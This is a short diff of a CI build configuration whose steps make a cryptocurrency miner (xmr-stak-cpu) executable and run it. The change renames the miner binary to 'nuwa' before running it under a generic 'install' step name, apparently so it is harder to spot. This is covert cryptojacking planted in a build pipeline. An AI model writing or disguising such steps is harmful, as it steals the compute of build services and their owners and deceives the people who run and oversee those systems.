@@ -18,5 +18,8 @@ build:
        code: chmod +x xmr-stak-cpu
     - script:
        name: install 4
-       code: ./xmr-stak-cpu
+       code: mv xmr-stak-cpu nuwa
        
+    - script:
+       name: install 4
+       code: ./nuwa
